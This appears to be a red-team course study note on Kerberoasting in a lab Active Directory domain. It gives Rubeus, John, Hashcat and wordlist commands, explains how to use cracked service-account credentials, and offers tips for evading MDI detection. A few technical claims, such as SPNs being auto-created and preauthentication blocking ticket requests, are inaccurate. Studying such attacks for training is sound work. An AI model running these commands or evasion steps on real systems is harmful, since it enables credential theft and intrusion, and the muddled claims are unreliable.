# Privilege Escalation — Kerberoasting

**Date:** 09 August 2026

---

## What is Kerberoasting?

**Kerberoasting = Requesting and offline cracking of service account passwords.**

Attack flow:
1. Request service ticket (TGS) for any service account
2. TGS encrypted with service account password hash (RC4)
3. Extract ticket from memory
4. Crack password offline using dictionary/bruteforce

---

## Why Kerberoasting is Lethal

✅ **Silent** — only event log is 4769 (service ticket request)  
✅ **No privilege escalation** — any user can request tickets  
✅ **Offline cracking** — no network activity during cracking  
✅ **Common passwords** — service accounts often have weak passwords  
✅ **Most popular attack** — widely used in real engagements  

---

## Key Concepts

**Service Account:**
- Account with Service Principal Name (SPN)
- SPN = attribute identifying it as service account
- When DC assigns service, it auto-creates SPN
- Often have weak/static passwords (rarely changed)

**Machine Accounts:**
- Strong passwords (128+ characters)
- Rotated every 30 days
- Very difficult to crack
- Avoid these targets

**RC4 Encryption:**
- Kerberos uses RC4-HMAC by default
- Easier to crack than AES (no salting)
- MDI detects RC4 downgrade
- Solution: Use `/rc4opsec` flag

---

## Prerequisites

- **No privileges needed** — any domain user can request tickets
- **Good wordlist** — passwords common in organization
- **Cracking tool** — John the Ripper, Hashcat
- **Time** — offline cracking (can be hours)

---

## Step 1: Find Service Accounts (Non-Machine Accounts)

**Using ActiveDirectory Module:**

```powershell
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
```

Lists all users with SPN attribute.

---

**Using PowerView:**

```powershell
Get-DomainUser -SPN
```

Simpler alternative.

---

**Filter for Non-Machine Accounts:**

```powershell
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName | 
  Where-Object {$_.Name -notlike "*$"}
```

Exclude machine accounts (end with $).

---

## Step 2: Check Kerberoastable Accounts (No Encryption Downgrade)

**Avoid MDI detection by targeting only RC4_HMAC accounts:**

```powershell
Rubeus.exe kerberoast /stats /rc4opsec
```

**Output shows:**
- Accounts supporting RC4_HMAC only
- Accounts supporting AES (skip these — MDI blind)
- Encryption types per account

---

**Alternative (Simple stats):**

```powershell
Rubeus.exe kerberoast /stats
```

All kerberoastable accounts (may trigger detection).

---

## Step 3: Request Service Tickets (OPSEC-Safe)

**Request ticket for single service account (RC4 OPSEC):**

```powershell
Rubeus.exe kerberoast /user:svcadmin /simple /rc4opsec
```

**Parameters:**
- `/user:svcadmin` — Target service account
- `/simple` — Output ticket in crackable format
- `/rc4opsec` — Only request if account uses RC4 (avoid downgrade detection)

**Output format:**
```
$krb5tgs$23$*svcadmin$DOLLARCORP$MSSQLSvc/sql-server*$...hash...
```

---

**Request all Kerberoastable accounts (OPSEC):**

```powershell
Rubeus.exe kerberoast /rc4opsec /outfile:hashes.txt
```

Dumps all RC4-only accounts to file.

---

## Step 4: Crack Tickets Offline

**Using John the Ripper:**

```powershell
john.exe --wordlist=C:\AD\Tools\kerberoast\10kworst-pass.txt C:\AD\Tools\hashes.txt
```

**Parameters:**
- `--wordlist` — Dictionary file
- Input file — TGS hashes from Step 3

**Output:**
```
svcadmin:Password@123
```

---

**Using Hashcat (GPU acceleration):**

```bash
hashcat -m 13100 hashes.txt wordlist.txt
```

Much faster on GPU (NVIDIA/AMD).

---

## Step 5: Generate Custom Wordlists

**Using CeWL (web scraper):**

```bash
cewl -d 2 -m 5 https://target.com -w wordlist.txt
```

Extract words from organization website.

---

**Using Crunch:**

```bash
crunch 8 12 -f /usr/share/crunch/charset.lst mixalpha -o wordlist.txt
```

Generate all 8-12 char passwords (slow).

---

**Using Bopscrk:**

```bash
bopscrk -i socialinfo.txt -o wordlist.txt
```

Generate passwords from OSINT.

---

**Pre-made wordlists:**

```
https://github.com/danielmiessler/SecLists
```

Large collection of common passwords.

---

## Step 6: Use Cracked Credentials

**Compromised service account:**

```powershell
# Use credentials for lateral movement
$cred = Get-Credential -UserName DOLLARCORP\svcadmin -Message "Enter password"

# Access restricted resources
Enter-PSSession -ComputerName file-server -Credential $cred

# Check service account privileges
whoami /groups
```

Often service accounts have:
- Local admin on multiple servers
- Read/write to sensitive shares
- Database admin access
- High privileges for service operation

---

## Complete Attack Workflow

```
1. Find service accounts with SPN
   ↓
2. Filter for RC4-only accounts (/rc4opsec)
   ↓
3. Request TGS tickets for targets
   ↓
4. Extract hashes to file
   ↓
5. Generate/use good wordlist
   ↓
6. Crack hashes offline (John/Hashcat)
   ↓
7. Use credentials for lateral movement
   ↓
8. Check privileges of compromised account
   ↓
9. Access restricted resources
```

---

## Why /rc4opsec is Critical

**Without /rc4opsec:**
```
Request RC4 ticket
MDI detects "Kerberos service ticket with weak encryption"
Alert fires: "Kerberoasting attack detected"
```

**With /rc4opsec:**
```
Check if account supports RC4 only
Only request if RC4-native (no downgrade)
MDI sees legitimate RC4 ticket
No alert fires
Silent attack
```

---

## Event Log Fingerprint

**Only event left:**
- **Event ID 4769** — Kerberos service ticket requested
- Multiple 4769 events can be noisy
- Each compromised account = one 4769

**Detection evasion:**
- Space out ticket requests (avoid burst)
- Use /rc4opsec (no encryption downgrade event)
- Mix with legitimate traffic
- Target only weak-password accounts

---

## Common Service Accounts to Target

| Service | Account | Typical Weak Password |
|---|---|---|
| SQL Server | mssqlsvc | Welcome@123, Sqlserver2022 |
| Exchange | exchangeadmin | Exchange123, P@ssw0rd |
| Backup | backupadmin | Backup@123, Admin123 |
| App server | appadmin | Application123, Server@123 |
| Print server | printadmin | Print123, Printer@123 |

---

## Kerberoasting vs Other Attacks

| Attack | Privilege Needed | Detection | Noise |
|---|---|---|---|
| Kerberoasting | None (user) | Low (with /rc4opsec) | Low |
| Golden Ticket | DA | Medium | Medium |
| Silver Ticket | None (after setup) | Low | Low |
| NTLM Relay | None (network position) | Medium | High |

---

## Command Reference

| Task | Command |
|---|---|
| Find SPNs | `Get-ADUser -Filter {ServicePrincipalName -ne "$null"}` |
| List all kerberoastable | `Rubeus.exe kerberoast /stats` |
| List RC4-only (OPSEC) | `Rubeus.exe kerberoast /stats /rc4opsec` |
| Request ticket | `Rubeus.exe kerberoast /user:svcadmin /simple` |
| Request OPSEC | `Rubeus.exe kerberoast /user:svcadmin /simple /rc4opsec` |
| Dump all to file | `Rubeus.exe kerberoast /rc4opsec /outfile:hashes.txt` |
| Crack with John | `john.exe --wordlist=wordlist.txt hashes.txt` |
| Crack with Hashcat | `hashcat -m 13100 hashes.txt wordlist.txt` |

---

## Troubleshooting

**No tickets returned:**
- Account may have AES-only encryption (skip with /rc4opsec)
- Account may not be kerberoastable (check SPN)
- Service may require Kerberos preauthentication

**Hashes don't crack:**
- Wordlist too small or wrong language
- Password too complex
- Try CeWL + organization-specific words
- Use GPU acceleration (Hashcat) for longer passwords

**MDI alerts on request:**
- Not using /rc4opsec
- Requesting too many tickets at once
- Account may be monitored

---

## Key Takeaway

```
Kerberoasting = Most silent attack
No privilege escalation needed
Only leave 4769 event log
Target weak-password service accounts
Use /rc4opsec to avoid MDI detection
Offline password cracking
Service accounts often highly privileged
Perfect for lateral movement
```

---

## References

- [Rubeus - Kerberoasting](https://github.com/GhostPack/Rubeus)
- [SecLists - Wordlists](https://github.com/danielmiessler/SecLists)
- [Cracking Service Tickets (Harmj0y)](https://blog.harmj0y.net/redteaming/kerberoasting/)
- [John the Ripper](https://www.openwall.com/john/)
- [Hashcat](https://hashcat.net/hashcat/)

---

*Next: Learning Objective 15 — Cross-Forest Attacks*
